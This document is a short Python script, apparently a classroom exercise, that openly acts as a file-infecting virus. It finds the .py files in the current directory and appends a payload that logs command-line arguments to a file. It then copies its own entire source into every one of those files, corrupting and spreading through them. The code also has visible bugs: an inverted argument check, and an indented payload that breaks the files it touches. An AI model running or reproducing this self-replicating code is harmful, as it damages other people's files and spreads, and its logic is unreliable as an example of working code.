import os
import sys 

current_directory = os.getcwd()

files = os.listdir(current_directory)

py_files = []

for file in files:
    if file.endswith(".py"):
        py_files.append(file)

print(py_files)

if len(sys.argv) != 1:
    print("Need to enter Python file as argument!")
    sys.exit(1)

infected = False

virus = """
    import sys
    with open("Q1C.out", "a") as txt_file:
        for arg in sys.argv:
            txt_file.write(arg + ' ')
        txt_file.write('\\n')
"""


flag = "    'Infected by virus'"

for py_file in py_files:
    with open(py_file, 'r') as file:
        for line in file:
            if flag in line:
                infected = True

    with open(py_file, 'a') as file:
        if infected == False:
            file.write(virus)
            file.write(f'\n{flag}\n')
            infected = True

    with open("Q1C.py", "r") as virus_file:
        virus_file = virus_file.read()
    
    infected = False
    print(infected)

    with open(__file__, "r") as f:
        for line in f:
            with open(py_file, "a") as f2:  
                f2.write(line)